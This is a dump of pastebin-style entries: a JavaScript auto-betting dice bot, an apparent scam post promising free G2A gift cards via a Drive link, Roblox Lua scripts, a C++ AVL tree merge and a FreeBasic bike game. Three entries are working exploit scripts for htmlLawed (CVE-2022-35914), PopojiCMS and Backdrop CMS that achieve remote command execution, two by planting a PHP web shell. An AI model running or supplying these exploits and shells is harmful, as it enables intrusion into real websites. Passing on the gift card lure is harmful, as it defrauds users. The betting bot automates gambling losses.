id,title,username,language,date,content
8vJw9x08,snowybot private archive released,coinwalk,JavaScript,Monday 20th of May 2024 01:03:17 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.001;
var beast = prefit;
var tens = (prefit*10);
var hunt = (prefit*100);
var tentyfour = (prefit*64)
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var mighty = elderly;
var baboon = ((Math.floor(elderly/tens))*tens);
var joe = ((Math.floor(elderly/tens))*tens);
 
function go(){
great = Number(document.getElementById('pct_balance').value);
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(baboon-tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great>=(joe+tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
    baboon = ((Math.floor(great/tens))*tens);
}
if ((great-beast)<=hunt){
console.log(""sorry we busted"");
return;
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1200);
}
go();"
4Yf3Vwgv,snowybot private archive released,coinwalk,JavaScript,Monday 20th of May 2024 12:57:18 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.001;
var beast = prefit;
var tens = (prefit*10);
var hunt = (prefit*100);
var tentyfour = (prefit*64)
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var mighty = elderly;
var baboon = ((Math.floor(elderly/tens))*tens);
var joe = ((Math.floor(elderly/tens))*tens);
 
function go(){
great = Number(document.getElementById('pct_balance').value);
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(baboon-tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great>=(joe+tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great-beast)<=hunt){
console.log(""sorry we busted"");
return;
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1200);
}
go();"
6SXfDRxk,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 20th of May 2024 12:21:01 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_777080.pdf

Working as of:
20 May 2024"
pVKXfGZ1,MainScript NEW,Sungmingamerpro13,CSS,Monday 20th of May 2024 12:09:59 AM CDT,"-- Phantom
-- If you named your things the same as in the video then you don't have to rename things.

local StarterGui = game:GetService(""StarterGui"")
local Players = game:GetService(""Players"")
-- No need to touch above

-- You inserted these in ReplicatedStorage
local FrameVisible = game.ReplicatedStorage:FindFirstChild(""FrameVisible"") -- BoolValue
local PlayerImage = game.ReplicatedStorage:FindFirstChild(""PlayerImage"") -- RemoteEvent
local PlayerName = game.ReplicatedStorage:FindFirstChild(""PlayerName"") -- StringValue
local NPCImage = game.ReplicatedStorage:FindFirstChild(""NPCImage"")
local Text = game.ReplicatedStorage:FindFirstChild(""Text"") -- StringValue

local NPC = game.Workspace:FindFirstChild(""NPC"")

local Teleports = game.Workspace:FindFirstChild(""Teleports"")
local Sounds = game.Workspace:FindFirstChild(""Sounds"")
local Checkpoints = game.Workspace:FindFirstChild(""Checkpoints"")

-- Blank variables, do not touch
local RandomPlayer
local Message

function TypeSound()
    local Sound = Instance.new(""Sound"")
    Sound.Parent = game.Workspace
    Sound.Name = ""TypeSound""
    Sound.SoundId = ""http://www.roblox.com/asset/?id=3333976425"" -- You can change the typing sound if you like
    Sound.PlaybackSpeed = 1
    Sound.Volume = 0.5
    Sound:Play()
    coroutine.resume(coroutine.create(function()
        wait(1)
        Sound:Destroy()
    end))
end

function SetText(word)
    Message = word
    for i = 1, #Message do
        Text.Value = string.sub(Message, 1, i)
        TypeSound()
        wait(0.05) -- Time between each letter, 0.05 seconds is recommended. The smaller the faster.
    end
end

function SetNPCText(word)
    Message = word
    for i = 1, #Message do
		Text.Value = string.sub(Message, 1, i)
		NPCImage:FireAllClients(NPCImage)
		PlayerName.Value = ""Jeff"" -- Put whatever you like here
        TypeSound()
        wait(0.05) -- Time between each letter, 0.05 seconds is recommended. The smaller the faster.
    end
end

function SetRandomPlayerText(word)
    Message = word
    RandomPlayer = nil
    wait()
    RandomPlayer = Players:GetChildren()[math.random(1, #Players:GetChildren())]
    PlayerName.Value = RandomPlayer.Name -- Sets the PlayerName to a random player's name
    PlayerImage:FireAllClients(RandomPlayer) -- Sets the image to a random player's head
    for i = 1, #Message do
        Text.Value = string.sub(Message, 1, i)
        TypeSound() -- Plays the typing sound
        wait(0.05)
    end
end

wait(10)
FrameVisible.Value = true
SetNPCText(""Hello and welcome to the Camping Site!"")
wait(5)
SetText(""You will be staying here for a few nights!"")
wait(5)
SetRandomPlayerText(""Yay!"")
wait(5)
SetNPCText(""Go take a look inside that house over there."")
wait(2)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint1.Position)
NPC.Humanoid.MoveToFinished:Wait()
for i, v in pairs(Players:GetChildren()) do
	v.Character.Torso.CFrame = Teleports.HouseTeleport.CFrame
end
wait(3)
SetRandomPlayerText(""Looks cozy!"")
wait(5)
SetNPCText(""Ok everyone, time to go outside."")
wait(5)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint2.Position)
NPC.Humanoid.MoveToFinished:Wait()
wait(0.2)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint3.Position)
NPC.Humanoid.MoveToFinished:Wait()
for i, v in pairs(Players:GetChildren()) do
	v.Character.Torso.CFrame = Teleports.PathTeleport.CFrame
end"
3h1x9FVb,Images,Sungmingamerpro13,CSS,Monday 20th of May 2024 12:09:20 AM CDT,"local PlayerImage = game.ReplicatedStorage:FindFirstChild(""PlayerImage"")
local NPCImage = game.ReplicatedStorage:FindFirstChild(""NPCImage"") -- the RemoteEvent in ReplicatedStorage called ""NPCImage""
local Players = game:GetService(""Players"")
local ThumbnailType = Enum.ThumbnailType.HeadShot
local ThumbnailSize = Enum.ThumbnailSize.Size150x150

PlayerImage.OnClientEvent:Connect(function(RandomPlayer)
    script.Parent.Image = Players:GetUserThumbnailAsync(RandomPlayer.userId, ThumbnailType, ThumbnailSize)
end)

NPCImage.OnClientEvent:Connect(function(NPCImage)
    script.Parent.Image = ""http://www.roblox.com/asset/?id=0"" -- Replace ""0"" with your Decal ID
end)"
jvds51uC,htmlLawed 1.2.5 - Remote Code Execution (RCE) - CVE-2022-35914,FlyFar,Bash,Sunday 19th of May 2024 11:34:27 PM CDT,"# Exploit Title: htmlLawed 1.2.5 - Remote Code Execution (RCE)
# Date: 2024-04-24
# Exploit Author: Miguel Redondo (aka d4t4s3c)
# Vendor Homepage: https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed
# Software Link: https://github.com/kesar/HTMLawed
# Version: <= 1.2.5
# Tested on: Linux
# CVE: CVE-2022-35914

banner(){
  echo ""  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _""
  echo "" / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ / ___|/ _ \/ | || |""
  echo ""| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_""
  echo ""| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__   _|""
  echo "" \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/  /_/|_|  |_|""
}

while getopts "":u:c:"" arg; do
  case $arg in
    u) URL=$OPTARG; let parameter_counter+=1 ;;
    c) CMD=$OPTARG; let parameter_counter+=1 ;;
  esac
done


if [ -z ""$URL"" ] || [ -z ""$CMD"" ]; then
  banner
  echo -e ""\n[i] Usage: ${0} -u <URL> -c <CMD>\n""
  exit
else
  banner
  echo -e ""\n[+] Command output:""
fi

curl -s -d ""sid=foo&hhook=exec&text=${CMD}"" -b ""sid=foo"" ${URL} | egrep '\&nbsp; \[[0-9]+\] =\>'| sed -E 's/\&nbsp; \[[0-9]+\] =\> (.*)<br \/>/\1/'
            "
BcnA4YPN,PopojiCMS 2.0.1 - Remote Command Execution (RCE),FlyFar,Python,Sunday 19th of May 2024 11:33:20 PM CDT,"# Exploit Title: PopojiCMS 2.0.1 - Remote Command Execution
# Date: 14/04/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.popojicms.org/
# Software Link:
https://github.com/PopojiCMS/PopojiCMS/archive/refs/tags/v2.0.1.zip
# Version: Version : 2.0.1
# Tested on: https://www.softaculous.com/apps/cms/PopojiCMS

import requests
import time
import sys

def exploit(url, username, password):

login_url = f""{url}/po-admin/route.php?mod=login&act=proclogin""
login_data = {""username"": username, ""password"": password}
headers = {""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": f
""{url}/po-admin/index.php""}
session = requests.Session()
login_response = session.post(login_url, data=login_data, headers=headers)
if ""Administrator PopojiCMS"" in login_response.text:
print(""Login Successful!"")
time.sleep(1) # 1 saniye bekle
else:
print(""Login Failed!"")
return

edit_url = f""{url}/po-admin/route.php?mod=setting&act=metasocial""
edit_data = {""meta_content"": """"""<html>
<body>
<form method=""GET"" name=""<?php echo basename($_SERVER['PHP_SELF']); ?>"">
<input type=""TEXT"" name=""cmd"" autofocus id=""cmd"" size=""80"">
<input type=""SUBMIT"" value=""Execute"">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>""""""}
edit_response = session.post(edit_url, data=edit_data, headers=headers)
if ""cmd"" in edit_response.text:
print(""Your shell is ready:"", url)
time.sleep(1)
else:
print(""Exploit Failed!"")
return

if __name__ == ""__main__"":
if len(sys.argv) != 4:
print(""Kullanım: python exploit.py sitename username password"")
sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
print(""Exploiting..."")
time.sleep(1)
print(""Logging in..."")
time.sleep(1)
exploit(url, username, password)
            "
4rDYiVxi,Backdrop CMS 1.27.1 - Remote Command Execution (RCE),FlyFar,Python,Sunday 19th of May 2024 11:32:24 PM CDT,"# Exploit Title: Backdrop CMS 1.27.1 - Remote Command Execution (RCE)
# Date: 04/27/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://backdropcms.org/
# Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip
# Version: latest
# Tested on: MacOS

import os
import time
import zipfile



def create_files():
info_content = """"""
type = module
name = Block
description = Controls the visual building blocks a page is constructed
with. Blocks are boxes of content rendered into an area, or region, of a
web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
""""""
shell_info_path = ""shell/shell.info""
os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörü
oluşturur
with open(shell_info_path, ""w"") as file:
file.write(info_content)

shell_content = """"""
<html>
<body>
<form method=""GET"" name=""<?php echo basename($_SERVER['PHP_SELF']); ?>"">
<input type=""TEXT"" name=""cmd"" autofocus id=""cmd"" size=""80"">
<input type=""SUBMIT"" value=""Execute"">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
""""""
shell_php_path = ""shell/shell.php""
with open(shell_php_path, ""w"") as file:
file.write(shell_content)

return shell_info_path, shell_php_path

def create_zip(info_path, php_path):
zip_filename = ""shell.zip""
with zipfile.ZipFile(zip_filename, 'w') as zipf:
# Dosyaları shell klasörü altında sakla
zipf.write(info_path, arcname='shell/shell.info')
zipf.write(php_path, arcname='shell/shell.php')
return zip_filename

def main(url):
print(""Backdrop CMS 1.27.1 - Remote Command Execution Exploit"")
time.sleep(3)

print(""Evil module generating..."")
time.sleep(2)

info_path, php_path = create_files()
zip_filename = create_zip(info_path, php_path)

print(""Evil module generated!"", zip_filename)
time.sleep(2)

print(""Go to "" + url + ""/admin/modules/install and upload the "" +
zip_filename + "" for Manual Installation."")
time.sleep(2)

print(""Your shell address:"", url + ""/modules/shell/shell.php"")

if __name__ == ""__main__"":
import sys
if len(sys.argv) < 2:
print(""Usage: python script.py [url]"")
else:
main(sys.argv[1])
            "
MU6A7NRD,AVL merge,hpnq,C++,Sunday 19th of May 2024 10:28:26 PM CDT,"#include ""bits/stdc++.h""
//speed coding handle

#define mp make_pair
#define cve(tpy) for (auto i : tpy) {for(auto j : i){cout << j << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

// types
#define pii pair<int, int>
#define pll pair<ll, ll>
#define vvi vector<vector<int>>
#define vvll vector<vector<ll>>
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e18)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1
using namespace std;
mt19937_64 rng(113113);
uniform_int_distribution<ll> drist;

struct node // структура для представления узлов дерева
{
    int info;//значение
    node *left;//ссылка на левое поддерево
    node *right;//ссылка на правое поддерево
    int balance; // поле баланса= высота правого поддерева - высота левого поддерева
};


int Height(node *root)// вычисляет высоту дерева
{
    if (root == nullptr) return 0;//если дерево пусто возвращаем 0
    //иначе
    int hLeft = Height(root->left),//считаем высоту левого поддерева
    hRight = Height(root->right); //считаем высоту правого поддерева
    return max(hLeft, hRight) + 1;

}

void SetBalance(node *(&root))//нахождение значение баланса для текущего узла
{
    if (root != nullptr)
        root->balance = Height(root->right) - Height(root->left);
}

void TurnLeft(node *(&root))//левый поворот АВЛ-дерева
{
    node *rightSubtree, *rightSubtreeLeftSubtree;
    rightSubtree = root->right;
    rightSubtreeLeftSubtree = rightSubtree->left;

    rightSubtree->left = root;
    root->right = rightSubtreeLeftSubtree;
    root = rightSubtree;
    SetBalance(root->left);
    SetBalance(root);
}

void TurnRight(node *(&root))//правый поворот
{
    node *leftSubtree, *leftSubtreeRightSubtree;
    leftSubtree = root->left;
    leftSubtreeRightSubtree = leftSubtree->right;

    leftSubtree->right = root;
    root->left = leftSubtreeRightSubtree;
    root = leftSubtree;
    SetBalance(root->right);
    SetBalance(root);
}


void insert(node *(&root), int d) // добавление узла в дерево поиска
{
    if (root == nullptr)//нашли пустой указатель – пустое место
    { //создаём новый узел дерева на найденном месте
        root = new node;
        root->info = d;
        root->balance = 0;
        root->left = nullptr;
        root->right = nullptr;
    }
    else//текущий узел не пуст
    {
        if (d > root->info)//идём в правое поддерево

        {
            insert(root->right, d);//добавляем узел в правое поддерево
            if (Height(root->right) - Height(root->left) > 1)//если баланс АВЛ-дерева нарушен
            {//выполняем вращения
                if (Height(root->right->right) < Height(root->right->left))//а если были еще проблемы в поддеревьях у правого поддерева
                    TurnRight(root->right);//то предварительно поворачиваем правое поддерево
                TurnLeft(root);//поворот дерева влево
            }
        }
        else if (d < root->info)//идём в левое поддерево

        {

            insert(root->left, d);//добавляем узел в левое поддерево
            if (Height(root->left) - Height(root->right) > 1)//если баланс АВЛ-дерева нарушен
            {
                if (Height(root->left->left) < Height(root->left->right))//а если были еще проблемы в поддеревьях у левого поддерева
                    TurnLeft(root->left);//то предварительно поворачиваем левое поддерево
                TurnRight(root);//поворот дерева вправо
            }
        }

        SetBalance(root);//пересчитываем значение баланса
    }
}

void copytree(node *(&T1), node * (&root)){
//    node *root = new node;


}
void print(node *p);
void balance(node *(&root)) // балансировка
{
    if (root != nullptr)//нашли пустой указатель – пустое место//текущий узел не пуст
    {
        // сортим правое
        balance(root->right);//добавляем узел в правое поддерево
        if (Height(root->right) - Height(root->left) > 1)//если баланс АВЛ-дерева нарушен
        {//выполняем вращения
            if (Height(root->right->right) < Height(root->right->left))//а если были еще проблемы в поддеревьях у правого поддерева
                TurnRight(root->right);//то предварительно поворачиваем правое поддерево
            TurnLeft(root);//поворот дерева влево
        }

        //идём в левое поддерево


        balance(root->left);//идём
        if (Height(root->left) - Height(root->right) > 1)//если баланс АВЛ-дерева нарушен
        {
            if (Height(root->left->left) < Height(root->left->right))//а если были еще проблемы в поддеревьях у левого поддерева
                TurnLeft(root->left);//то предварительно поворачиваем левое поддерево
            TurnRight(root);//поворот дерева вправо
            cout << ""PPPPP"" << endl;

        }


        SetBalance(root);//пересчитываем значение баланса
    }
}
node* merge(node *(&T1), node *(T2)){
    // выбрать левый в T2, удалить, добавить root(t1), добавить удалённое

    // удалить самую правую,
    // идем по 2му, когда высота
    node *v1 = T1, *pv1 = new node;
    while(v1->right){
        pv1 = v1;
        v1 = v1->right;

//        v->left = nullptr;
    }
    pv1->right = nullptr;
    // нашёл отчистил
    node *v2 = T2, *pv2 = new node;
    while(v2 != nullptr and Height(v2) != Height(T1)){
        cout << ""ERR "" << v2->info << endl;
        pv2 = v2;
        v2 = v2->left;
    }
    node *S = new node;
    S->info = v1->info;
    S->left = T1;
    S->right = v2;

    cout << ""\n S: \n"";
    print(S);
    cout << ""\nv2\n"" << v2->info;
    pv2->left = S;
//    balance(T2);
    cout << ""Start:\n"";
    print(T2);
    balance(T2);
    print(T2);
    cout << ""End\n"";
//    cout << ""LEFT:"" << v->info << "" "" << pv->info << ""\n"";
//    pv->left = T1;
    return T2;

//    insert(T2, v->info);




}

void output(node *p)// распечатка дерева в симметричном порядке
{
    if (p != nullptr)
    {
        output(p->left);
        cout << p->info << "" "";
        output(p->right);
    }
}

void print_n(const node *p, int n, int level, int prob)//печать n-ого уровня дерева, level - это номер уровня
{
    if (p)
    {
        if (level == n)
        {
            for (int i = 1; i <= prob; i++) cout << "" "";
            cout << p->info;
        }
        else
        {
            print_n(p->left, n, level + 1, prob);
            print_n(p->right, n, level + 1, prob);
        }
    }
}

void print(node *p) //распечатка дерева по уровням
{
    int h = Height(p);
    int prob = 3;
    if (p)
    {
        for (int i = 0; i <= h; i++)//вот здесь задаются номера уровней
        {
            print_n(p, i, 0, prob*(h - i));//вызывается функция печати n-ого уровня дерева
            cout << endl;
        }
    }
    cout << ""H "" << h << endl;
}


void clear(node **p) // очистка
{
    if ((*p) != nullptr) {
        cout << ""ERRr "" << (*p)->info << endl;

        clear(&(*p)->left);
        clear(&(*p)->right);

        delete *p;
        *p = nullptr;
    }
}

void solve()
{
    int  d;
    char ch;
    node *root;
    root = nullptr;
    do {
        cout << ""enter num"" << endl;
        cin >> d;
        insert(root, d);
        cout << ""eshe? (y/n)"" << endl;
        cin >> ch;

    } while (ch != 'n');

    node *root2;
    root2 = nullptr;
    do {
        cout << ""enter num"" << endl;
        cin >> d;
        insert(root2, d);
        cout << ""eshe? (y/n)"" << endl;
        cin >> ch;

    } while (ch != 'n');

    cout << endl;
    cout << ""print1"" << endl;
    print(root);

    cout << ""print2"" << endl;
    print(root2);
    node *t = merge(root, root2);
    cout << ""print:\n"";

    print(t);

    cout << ""simm:\n"";
    output(t);
//    cout << ""\n EDGE: "" << t->info << endl;
//    clear(&root);
//    clear(&root2);
    clear(&t);
    if (!root and !root2 and !t) { cout << ""cleared!"" << endl; }
    else { cout << ""err!"" << endl; }
    system(""pause"");
}

int main() {
    ios::sync_with_stdio(0);
    cin.tie(0);
#ifdef DEBUG
    freopen(""text.txt"", ""r"", stdin);
//    freopen(""output.txt"", ""w"", stdout);
#endif
    solve();
    return 1;
}

"
TeqE7wbW,Untitled,Mysoft,FreeBasic,Sunday 19th of May 2024 09:52:36 PM CDT,"#include ""fbgfx.bi""

'for N as long = 128 to 255
'  print chr$(N);"" "";
'  if (N and 15)=15 then print
'next N

'print ""/¨\__:__/¨\""
'print ""\_/  ^  \_/""

width 80,25
locate ,,0

dim as long BikeOldCol,BikeOldLin,BikeSpeed=1
dim as long iN

dim as string sRoad(5)
for N as long = 0 to 39
  sRoad(0) += ""##""
next N
for N as long = 1 to 5
  sRoad(N) = space(80)
next N

dim as integer iGap,iJump=40,iBikeJump=0
do
  dim as long BikeLin=15+iBikeJump\50,BikeCol=20+(cos(BikeSpeed/25)*25)
  if BikeOldLin <> BikeLin or BikeOldCol <> BikeCol then
    color 3 : BikeOldCol = BikeCol : BikeOldLin = BikeLin
    locate BikeLin-1,BikeCol : print ""             "";
    locate BikeLin+0,BikeCol : print ""          _  "";
    locate BikeLin+1,BikeCol : print ""      _   |  "";
    locate BikeLin+2,BikeCol : print ""    __:__    "";
    locate BikeLin+3,BikeCol : print ""      ^      "";
    locate BikeLin+4,BikeCol : print ""             "";
  end if
  if iN then color 7 else color 9
  locate BikeLin+2,BikeCol+11 : print !""\\\8\8\8/\8\8\8\8\8\8\8\8\238"";
  locate BikeLin+3,BikeCOl+10 : print !""_\8\8\8\8\8\8\8\8/\8\8\8\\"";
  if iN then color 9 else color 7
  locate BikeLin+2,BikeCOl+10 : print !""\238\8\8\8\8\8\8\8\8\\\8\8\8/"";
  locate BikeLin+3,BikeCOl+11 : print !""/\8\8\8\\\8\8\8\8\8\8\8\8_"";
  
  if iGap then 
    iGap = iGap-1
  else    
    if rnd<.01 then iGap = 21
  end if
  
  if iBikeJump=0 then
    if multikey(fb.SC_SPACE) then iJump = -BikeSpeed : iBikeJump = -1
  else
    iBikeJump += iJump
    if iBikeJump > 0 then iBikeJump=0
    if iJump < 50 then iJump += 4
    
  end if
  
  color 6
  for N as long = 0 to 5
    if N=1 then color 5
    locate 19+N,1 : print sRoad(N);
  next N
  
  for N as long = 0 to 5
    sRoad(N) = mid(sRoad(N),2)
    if N=0 then
      if iGap>10 then 
        if iGap=21 then sRoad(N) += ""\"" else sRoad(N) += "" ""
      elseif iGap then
        sRoad(N) += ""-""
      else
        if iN then sRoad(N) += ""="" else sRoad(N) += ""-""
      end if
    else
      if iGap=1 orelse iGap=21 then
        sRoad(N) += ""|""
      elseif iGap=0 andalso rnd < .05 then 
        sRoad(N) += chr(32+rnd*15) 
      else 
        sRoad(N) += "" ""
      end if
    end if
  next N   
  
  iN xor= 1
  sleep 200-BikeSpeed*4  
  if BikeSpeed < 40 andalso iN then BikeSpeed += 1
  
loop"
